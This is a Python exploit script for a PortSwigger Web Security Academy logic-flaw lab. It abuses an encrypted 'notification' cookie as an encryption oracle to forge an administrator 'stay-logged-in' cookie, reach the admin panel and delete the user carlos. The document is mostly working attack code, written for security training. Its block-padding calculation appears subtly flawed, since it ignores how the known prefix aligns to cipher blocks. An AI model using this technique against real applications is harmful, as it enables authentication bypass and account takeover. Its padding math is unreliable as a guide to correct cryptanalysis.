# Lab 11 — Authentication bypass via encryption oracle
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle
#
# Vulnerability: The blog comment form's email-validation error message is
#                ENCRYPTED and reflected as a 'notification' cookie — using
#                the SAME encryption scheme that protects the
#                'stay-logged-in' cookie's username:timestamp structure
# Aim:           Forge a valid stay-logged-in cookie for administrator and
#                delete carlos
#
# Technique:
#   1. Submit an invalid email as a comment -> get back an ENCRYPTED
#      "Invalid email address: {input}" cookie (the oracle).
#   2. Feed "administrator:<timestamp>" through the oracle.
#   3. Strip the known-length "Invalid email address: " prefix from the
#      resulting ciphertext (byte-level, via base64 decode/re-encode).
#   4. Pad with filler so total length is a clean cipher block multiple,
#      repeat, and strip that many bytes instead.
#   5. Use the isolated ciphertext as the stay-logged-in cookie value.
#
#   ⚠  This is one of the most involved labs in the Academy — exact prefix
#      length and block size can vary. This script automates the
#      mechanical steps (oracle queries + byte stripping) but you should
#      verify the prefix length and block size against your specific lab
#      instance's actual behaviour before trusting the final cookie.
#
# Usage: python business_logic_lab11.py <url>

import sys
import time
import urllib3
from proxies import proxies
from business_logic_utils import (banner, section, make_session, login,
                                   get_csrf_from_response, strip_bytes_from_ciphertext,
                                   check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

KNOWN_PREFIX = "Invalid email address: "
KNOWN_PREFIX_LEN = len(KNOWN_PREFIX)   # 23 — used per the lab's documented behaviour
BLOCK_SIZE = 32                         # this lab's block cipher requires 32-byte multiples


def submit_comment_get_notification(session, url, post_id, email_value):
    """
    Submit a blog comment with the given (deliberately invalid) email
    value, and return the 'notification' cookie value the server sets.
    """
    post_page = session.get(f"{url}/post", params={"postId": post_id})
    csrf = get_csrf_from_response(post_page.text)

    data = {
        "csrf": csrf,
        "postId": str(post_id),
        "comment": "test",
        "name": "attacker",
        "email": email_value,
        "website": "",
    }
    r = session.post(f"{url}/post/comment", data=data, allow_redirects=True)
    return session.cookies.get("notification")


if __name__ == "__main__":
    banner()
    section("LAB 11 — AUTHENTICATION BYPASS VIA ENCRYPTION ORACLE")

    if len(sys.argv) != 2:
        print("  Usage: python business_logic_lab11.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    print("\n  ── Step 1: confirm the oracle by submitting an invalid email\n")
    baseline_notification = submit_comment_get_notification(session, url, 1, "wiener")
    if not baseline_notification:
        print("  ✘  No 'notification' cookie received — inspect the comment")
        print("     endpoint manually; field names may differ on this instance.")
        sys.exit(1)
    print(f"  ✔  Oracle confirmed — notification cookie: {baseline_notification[:40]}...\n")

    # ── Step 2: figure out a timestamp to use ──────────────────────────────
    fake_timestamp = str(int(time.time()))
    target_plaintext = f"administrator:{fake_timestamp}"
    print(f"  ── Step 2: target plaintext to forge: {target_plaintext!r}\n")

    # ── Step 3: try the direct (unpadded) approach first ────────────────────
    print(f"  ── Step 3: query oracle with target plaintext, strip {KNOWN_PREFIX_LEN}-byte prefix\n")
    notification_direct = submit_comment_get_notification(session, url, 1, target_plaintext)

    if notification_direct:
        stripped_direct = strip_bytes_from_ciphertext(notification_direct, KNOWN_PREFIX_LEN)
        print(f"  ℹ  Stripped (unpadded) cookie candidate: {stripped_direct[:40]}...\n")

        # Try it directly first — some lab instances don't need padding
        test_session = make_session(proxies)
        test_session.cookies.set("session", session.cookies.get("session"))
        test_session.cookies.set("stay-logged-in", stripped_direct)
        r_test = test_session.get(f"{url}/admin")
        if r_test.status_code == 200:
            print("  ✔  Direct (unpadded) forged cookie worked!")
            print_box("WORKING stay-logged-in COOKIE VALUE", stripped_direct)
        else:
            print(f"  ℹ  Direct attempt returned {r_test.status_code} — likely needs padding")
            print("     to satisfy the block cipher's size requirement. Proceeding to")
            print("     the padded approach below.\n")

            # ── Step 4: pad to a clean block-size multiple ───────────────────
            total_len_needed = ((len(target_plaintext) // BLOCK_SIZE) + 1) * BLOCK_SIZE
            padding_len = total_len_needed - len(target_plaintext)
            padded_plaintext = ("A" * padding_len) + target_plaintext
            total_prefix_to_strip = KNOWN_PREFIX_LEN + padding_len

            print(f"  ── Step 4: pad plaintext to a {BLOCK_SIZE}-byte multiple\n")
            print(f"  ℹ  Padding added        : {padding_len} chars")
            print(f"  ℹ  Total prefix to strip: {total_prefix_to_strip} bytes")
            print(f"  ℹ  Padded plaintext     : {padded_plaintext!r}\n")

            notification_padded = submit_comment_get_notification(session, url, 1, padded_plaintext)
            if notification_padded:
                stripped_padded = strip_bytes_from_ciphertext(notification_padded, total_prefix_to_strip)
                print_box("FORGED stay-logged-in COOKIE VALUE (padded)", stripped_padded)

                test_session2 = make_session(proxies)
                test_session2.cookies.set("session", session.cookies.get("session"))
                test_session2.cookies.set("stay-logged-in", stripped_padded)
                r_test2 = test_session2.get(f"{url}/admin")
                check_status(r_test2, 200, "GET /admin with padded forged cookie")

                if r_test2.status_code == 200:
                    print("\n  ── Step 5: delete carlos\n")
                    r_delete = test_session2.post(f"{url}/admin/delete", data={"username": "carlos"})
                    check_status(r_delete, [200, 302], "Delete carlos")

    print()
    print("  ℹ  If neither approach worked automatically, the exact prefix")
    print("     length or block size may differ on this lab instance.")
    print("     Verify manually using Burp Decoder: URL-decode -> base64-decode")
    print("     the baseline notification cookie, count the exact prefix bytes")
    print("     before your echoed input begins, and adjust KNOWN_PREFIX_LEN")
    print("     and BLOCK_SIZE at the top of this script accordingly.")
